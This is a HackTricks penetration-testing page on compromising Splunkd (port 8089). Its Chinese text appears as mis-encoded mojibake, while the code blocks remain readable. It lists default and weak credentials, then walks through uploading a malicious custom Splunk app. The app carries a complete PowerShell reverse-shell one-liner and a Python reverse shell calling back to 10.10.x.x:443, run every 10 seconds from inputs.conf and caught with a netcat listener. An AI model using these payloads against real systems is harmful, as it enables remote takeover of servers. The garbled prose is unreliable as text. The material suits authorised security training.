# 8089 - æ¸—é€æµ‹è¯• Splunkd

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆçš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

Splunk æ˜¯ä¸€ä¸ª**æ—¥å¿—åˆ†æå·¥å…·**ï¼Œåœ¨**æ”¶é›†ã€åˆ†æå’Œå¯è§†åŒ–æ•°æ®**æ–¹é¢å‘æŒ¥ç€å…³é”®ä½œç”¨ã€‚è™½ç„¶å®ƒæœ€åˆçš„ç›®çš„ä¸æ˜¯ä½œä¸º**SIEMï¼ˆå®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†ï¼‰**å·¥å…·ï¼Œä½†åœ¨**å®‰å…¨ç›‘æ§**å’Œ**ä¸šåŠ¡åˆ†æ**é¢†åŸŸä¸­å˜å¾—è¶Šæ¥è¶Šå—æ¬¢è¿ã€‚

Splunk éƒ¨ç½²ç»å¸¸ç”¨äºå­˜å‚¨**æ•æ„Ÿæ•°æ®**ï¼Œå¦‚æœæ”»å‡»è€…æˆåŠŸåœ° compromise ç³»ç»Ÿï¼Œå®ƒå¯ä»¥ä½œä¸ºæ½œåœ¨æ”»å‡»è€…çš„**å®è´µä¿¡æ¯æ¥æº**ã€‚**é»˜è®¤ç«¯å£ï¼š8089**
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk WebæœåŠ¡å™¨é»˜è®¤åœ¨ç«¯å£8000ä¸Šè¿è¡Œ**ã€‚
{% endhint %}

## æšä¸¾

### å…è´¹ç‰ˆæœ¬

Splunk Enterpriseè¯•ç”¨ç‰ˆåœ¨**60å¤©åè½¬æ¢ä¸ºå…è´¹ç‰ˆæœ¬**ï¼Œ**æ— éœ€èº«ä»½éªŒè¯**ã€‚ç³»ç»Ÿç®¡ç†å‘˜ç»å¸¸å®‰è£…Splunkè¯•ç”¨ç‰ˆè¿›è¡Œæµ‹è¯•ï¼Œ**éšåè¢«é—å¿˜**ã€‚è¿™å°†è‡ªåŠ¨è½¬æ¢ä¸ºæ²¡æœ‰ä»»ä½•å½¢å¼èº«ä»½éªŒè¯çš„å…è´¹ç‰ˆæœ¬ï¼Œåœ¨ç¯å¢ƒä¸­å¼•å…¥äº†å®‰å…¨æ¼æ´ã€‚ä¸€äº›ç»„ç»‡å¯èƒ½ç”±äºé¢„ç®—é™åˆ¶è€Œé€‰æ‹©å…è´¹ç‰ˆæœ¬ï¼Œå´æ²¡æœ‰å®Œå…¨ç†è§£æ²¡æœ‰ç”¨æˆ·/è§’è‰²ç®¡ç†çš„å½±å“ã€‚

### é»˜è®¤å‡­æ®

åœ¨æ—§ç‰ˆæœ¬çš„Splunkä¸­ï¼Œé»˜è®¤å‡­æ®ä¸º**`admin:changeme`**ï¼Œæ–¹ä¾¿åœ°æ˜¾ç¤ºåœ¨ç™»å½•é¡µé¢ä¸Šã€‚\
ç„¶è€Œï¼Œ**æœ€æ–°ç‰ˆæœ¬çš„Splunk**åœ¨**å®‰è£…è¿‡ç¨‹ä¸­è®¾ç½®å‡­æ®**ã€‚å¦‚æœé»˜è®¤å‡­æ®ä¸èµ·ä½œç”¨ï¼Œå€¼å¾—æ£€æŸ¥å¸¸è§å¼±å¯†ç ï¼Œå¦‚`admin`ï¼Œ`Welcome`ï¼Œ`Welcome1`ï¼Œ`Password123`ç­‰ã€‚

### è·å–ä¿¡æ¯

ç™»å½•åˆ°Splunkåï¼Œæˆ‘ä»¬å¯ä»¥**æµè§ˆæ•°æ®**ï¼Œè¿è¡Œ**æŠ¥å‘Š**ï¼Œåˆ›å»º**ä»ªè¡¨æ¿**ï¼Œä»Splunkbaseåº“ä¸­**å®‰è£…åº”ç”¨ç¨‹åº**ï¼Œä»¥åŠå®‰è£…è‡ªå®šä¹‰åº”ç”¨ç¨‹åºã€‚\
æ‚¨è¿˜å¯ä»¥è¿è¡Œä»£ç ï¼šSplunkæœ‰å¤šç§**è¿è¡Œä»£ç **çš„æ–¹å¼ï¼Œå¦‚æœåŠ¡å™¨ç«¯Djangoåº”ç”¨ç¨‹åºï¼ŒRESTç«¯ç‚¹ï¼Œè„šæœ¬è¾“å…¥å’Œè­¦æŠ¥è„šæœ¬ã€‚åœ¨SplunkæœåŠ¡å™¨ä¸Šè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„å¸¸è§æ–¹æ³•æ˜¯é€šè¿‡è„šæœ¬è¾“å…¥ã€‚

æ­¤å¤–ï¼Œç”±äºSplunkå¯ä»¥å®‰è£…åœ¨Windowsæˆ–Linuxä¸»æœºä¸Šï¼Œå¯ä»¥åˆ›å»ºè„šæœ¬è¾“å…¥æ¥è¿è¡ŒBashã€PowerShellæˆ–æ‰¹å¤„ç†è„šæœ¬ã€‚

### Shodan

* `Splunkæ„å»º`

## RCE

### åˆ›å»ºè‡ªå®šä¹‰åº”ç”¨ç¨‹åº

è‡ªå®šä¹‰åº”ç”¨ç¨‹åºå¯ä»¥è¿è¡Œ**Pythonï¼Œæ‰¹å¤„ç†ï¼ŒBashæˆ–PowerShellè„šæœ¬**ã€‚\
è¯·æ³¨æ„ï¼Œ**Splunkå·²å®‰è£…Python**ï¼Œå› æ­¤å³ä½¿åœ¨**Windows**ç³»ç»Ÿä¸­ï¼Œæ‚¨ä¹Ÿå¯ä»¥è¿è¡ŒPythonä»£ç ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨[**æ­¤**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunkè½¯ä»¶åŒ…æ¥ååŠ©æˆ‘ä»¬ã€‚æ­¤å­˜å‚¨åº“ä¸­çš„**`bin`**ç›®å½•æœ‰[Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py)å’Œ[PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1)çš„ç¤ºä¾‹ã€‚è®©æˆ‘ä»¬é€æ­¥è¿›è¡Œã€‚

è¦å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ä½¿ç”¨ä»¥ä¸‹ç›®å½•ç»“æ„åˆ›å»ºè‡ªå®šä¹‰Splunkåº”ç”¨ç¨‹åºï¼š
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`**ç›®å½•å°†åŒ…å«æˆ‘ä»¬æ‰“ç®—è¿è¡Œçš„ä»»ä½•è„šæœ¬ï¼ˆåœ¨æœ¬ä¾‹ä¸­æ˜¯ä¸€ä¸ª**PowerShell**åå‘shellï¼‰ï¼Œé»˜è®¤ç›®å½•å°†æœ‰æˆ‘ä»¬çš„`inputs.conf`æ–‡ä»¶ã€‚æˆ‘ä»¬çš„åå‘shellå°†æ˜¯ä¸€ä¸ª**PowerShellä¸€è¡Œå‘½ä»¤ï¼š**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
[inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) æ–‡ä»¶å‘Šè¯‰ Splunk **è¦è¿è¡Œå“ªä¸ªè„šæœ¬** ä»¥åŠä»»ä½•å…¶ä»–æ¡ä»¶ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†åº”ç”¨è®¾ç½®ä¸ºå¯ç”¨ï¼Œå¹¶å‘Šè¯‰ Splunk æ¯éš” 10 ç§’è¿è¡Œä¸€æ¬¡è„šæœ¬ã€‚é—´éš”å§‹ç»ˆä»¥ç§’ä¸ºå•ä½ï¼Œåªæœ‰åœ¨å­˜åœ¨æ­¤è®¾ç½®æ—¶ï¼Œè¾“å…¥ï¼ˆè„šæœ¬ï¼‰æ‰ä¼šè¿è¡Œã€‚
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
æˆ‘ä»¬éœ€è¦`.bat`æ–‡ä»¶ï¼Œåœ¨éƒ¨ç½²åº”ç”¨ç¨‹åºæ—¶è¿è¡Œå¹¶æ‰§è¡ŒPowerShellä¸€è¡Œå‘½ä»¤ã€‚

ä¸‹ä¸€æ­¥æ˜¯é€‰æ‹©`ä»æ–‡ä»¶å®‰è£…åº”ç”¨ç¨‹åº`å¹¶ä¸Šä¼ åº”ç”¨ç¨‹åºã€‚

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

åœ¨ä¸Šä¼ æ¶æ„è‡ªå®šä¹‰åº”ç”¨ç¨‹åºä¹‹å‰ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨Netcatæˆ–[socat](https://linux.die.net/man/1/socat)å¯åŠ¨ä¸€ä¸ªç›‘å¬å™¨ã€‚
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
åœ¨`ä¸Šä¼ åº”ç”¨ç¨‹åº`é¡µé¢ï¼Œç‚¹å‡»æµè§ˆï¼Œé€‰æ‹©æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„tarballï¼Œç„¶åç‚¹å‡»`ä¸Šä¼ `ã€‚ä¸€æ—¦æˆ‘ä»¬ä¸Šä¼ åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºçš„çŠ¶æ€å°†è‡ªåŠ¨åˆ‡æ¢ä¸º`å·²å¯ç”¨`ï¼Œå¹¶ä¸”æˆ‘ä»¬å°†æ”¶åˆ°ä¸€ä¸ªåå‘shellã€‚

#### Linux

å¦‚æœæˆ‘ä»¬åœ¨å¤„ç†Linuxä¸»æœºï¼Œæˆ‘ä»¬éœ€è¦åœ¨åˆ›å»ºtarballå¹¶ä¸Šä¼ è‡ªå®šä¹‰æ¶æ„åº”ç”¨ç¨‹åºä¹‹å‰ç¼–è¾‘`rev.py` Pythonè„šæœ¬ã€‚å…¶ä½™æµç¨‹å°†ä¿æŒä¸å˜ï¼Œæˆ‘ä»¬å°†åœ¨Netcatç›‘å¬å™¨ä¸Šæ”¶åˆ°ä¸€ä¸ªåå‘shellè¿æ¥ï¼Œç„¶åå°±å¯ä»¥å¼€å§‹æ“ä½œäº†ã€‚
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### è¿œç¨‹ä»£ç æ‰§è¡Œ & ææƒ

åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å…³äºå¦‚ä½•æ»¥ç”¨æ­¤æœåŠ¡ä»¥æå‡æƒé™å¹¶è·å–æŒä¹…æ€§çš„è§£é‡Šï¼š

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
